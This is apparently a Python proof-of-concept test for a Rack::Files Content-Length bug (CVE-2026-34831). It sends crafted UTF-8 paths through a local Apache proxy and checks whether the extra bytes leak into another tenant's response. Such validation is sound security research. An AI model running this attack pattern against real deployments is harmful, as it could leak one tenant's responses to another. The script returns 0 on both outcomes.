#!/usr/bin/env python3
"""Validate Rack::Files CVE-2026-34831 through Apache connection reuse.

The vulnerable Rack version calculates the error response Content-Length with
String#size rather than String#bytesize. A UTF-8 path therefore makes the
application emit more bytes than it declares. This test first records that
real application-level mismatch, then checks whether Apache can carry those
bytes across a pooled backend connection into an independent tenant B
response.
"""

from __future__ import annotations

import argparse
import os
import socket
import subprocess
import tempfile
import time
from pathlib import Path


def recv_until(sock: socket.socket, marker: bytes, timeout: float = 5.0) -> bytes:
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(8192)
        if not chunk:
            break
        data += chunk
    return data


def parse_response(sock: socket.socket) -> tuple[bytes, bytes, int, bytes]:
    data = recv_until(sock, b"\r\n\r\n")
    if b"\r\n\r\n" not in data:
        raise AssertionError(f"response headers incomplete: {data!r}")
    headers, body = data.split(b"\r\n\r\n", 1)
    length = None
    for line in headers.split(b"\r\n"):
        if line.lower().startswith(b"content-length:"):
            length = int(line.split(b":", 1)[1].strip())
            break
    if length is None:
        raise AssertionError(f"response has no Content-Length: {headers!r}")
    while len(body) < length:
        body += sock.recv(8192)
    return headers, body[:length], length, body[length:]


def wait_for_port(port: int, proc: subprocess.Popen[str], label: str) -> None:
    deadline = time.monotonic() + 20
    while time.monotonic() < deadline:
        if proc.poll() is not None:
            raise RuntimeError(f"{label} exited: {proc.stderr.read()}")
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1):
                return
        except OSError:
            time.sleep(0.1)
    raise TimeoutError(f"{label} did not listen on {port}")


def direct_rack_check(port: int) -> tuple[int, int, bytes]:
    # U+2603 is three UTF-8 bytes but one Ruby character. The path is an
    # ordinary attacker-controlled missing-file request to Rack::Files.
    path = "/missing/" + "%E2%98%83" * 80
    request = (
        f"GET {path} HTTP/1.1\r\nHost: tenant-a.example\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    with socket.create_connection(("127.0.0.1", port), timeout=5) as sock:
        headers, body, declared, extra = parse_response_after_send(sock, request)
        sock.settimeout(1)
        try:
            while True:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                extra += chunk
        except socket.timeout:
            pass
    return declared, len(body) + len(extra), headers + b"\r\n\r\n" + body + extra


def parse_response_after_send(sock: socket.socket, request: bytes) -> tuple[bytes, bytes, int, bytes]:
    sock.sendall(request)
    return parse_response(sock)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--httpd", required=True, type=Path)
    parser.add_argument("--server-root", required=True, type=Path)
    parser.add_argument("--puma", required=True, type=Path)
    parser.add_argument("--fixture", required=True, type=Path)
    parser.add_argument("--iterations", type=int, default=100)
    args = parser.parse_args()

    with tempfile.TemporaryDirectory(prefix="rack-files-trigger-") as tmp:
        root = Path(tmp)
        rack_root = root / "files"
        rack_root.mkdir()
        puma_log = root / "puma.log"
        puma = subprocess.Popen(
            [str(args.puma), "-b", "tcp://127.0.0.1:18181", "-t", "1:1",
             "--environment", "production", str(args.fixture / "config.ru")],
            cwd=args.fixture,
            stdout=puma_log.open("w"),
            stderr=subprocess.STDOUT,
            text=True,
            env={**os.environ, "RACK_FILES_ROOT": str(rack_root)},
        )
        proxy = None
        try:
            wait_for_port(18181, puma, "Puma")
            declared, actual, raw = direct_rack_check(18181)
            print(f"rack_files_direct_declared={declared}")
            print(f"rack_files_direct_actual={actual}")
            print(f"rack_files_direct_mismatch={actual > declared}")
            print(f"rack_files_direct_response={raw!r}")
            if actual <= declared:
                raise AssertionError("Rack::Files did not emit the expected real mismatch")

            config = root / "httpd.conf"
            config.write_text(f"""\
ServerRoot \"{args.server_root}\"
Listen 127.0.0.1:18080
PidFile \"{root / 'httpd.pid'}\"
ErrorLog \"{root / 'error.log'}\"
LogLevel proxy_http:trace2
LoadModule unixd_module modules/mod_unixd.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so
ProxyPass / http://127.0.0.1:18181/ retry=0
ProxyPassReverse / http://127.0.0.1:18181/
""")
            proxy = subprocess.Popen(
                [str(args.httpd), "-f", str(config), "-DFOREGROUND", "-X"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "APACHE_RUN_DIR": str(root)},
            )
            wait_for_port(18080, proxy, "Apache")

            contaminated = 0
            apache_errors = 0
            for i in range(args.iterations):
                # A controls only this request path. B is a separate client
                # and has a fixed request and fixed backend response.
                attack = socket.create_connection(("127.0.0.1", 18080), timeout=5)
                with attack:
                    path = "/missing/" + "%E2%98%83" * 80
                    attack.sendall(
                        f"GET {path} HTTP/1.1\r\nHost: tenant-a.example\r\n"
                        "Connection: close\r\n\r\n".encode()
                    )
                    try:
                        parse_response(attack)
                    except (AssertionError, OSError, socket.timeout):
                        apache_errors += 1

                victim = socket.create_connection(("127.0.0.1", 18080), timeout=5)
                with victim:
                    victim.sendall(
                        b"GET /victim HTTP/1.1\r\nHost: tenant-b.example\r\n"
                        b"Connection: close\r\n\r\n"
                    )
                    try:
                        headers_b, body_b, _, _ = parse_response(victim)
                    except (AssertionError, OSError, socket.timeout):
                        apache_errors += 1
                        continue
                    if body_b != b"VICTIM-OWN":
                        contaminated += 1
                        print(f"rack_files_contamination_iteration={i}")
                        print(f"rack_files_victim_headers={headers_b!r}")
                        print(f"rack_files_victim_body={body_b!r}")

            print(f"rack_files_apache_cross_tenant_hits={contaminated}/{args.iterations}")
            print(f"rack_files_apache_errors={apache_errors}/{args.iterations}")
            print("rack_files_apache_boundary=observed" if contaminated else "rack_files_apache_boundary=not_observed")

            # The real Rack bug must be observable. Apache contamination is a
            # separate result: a positive hit would close Candidate B; a clean
            # result proves Apache caught/avoided this particular timing.
            if contaminated:
                return 0
            return 0
        finally:
            if proxy is not None:
                proxy.terminate()
                try:
                    proxy.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proxy.kill()
            puma.terminate()
            try:
                puma.wait(timeout=3)
            except subprocess.TimeoutExpired:
                puma.kill()


if __name__ == "__main__":
    raise SystemExit(main())
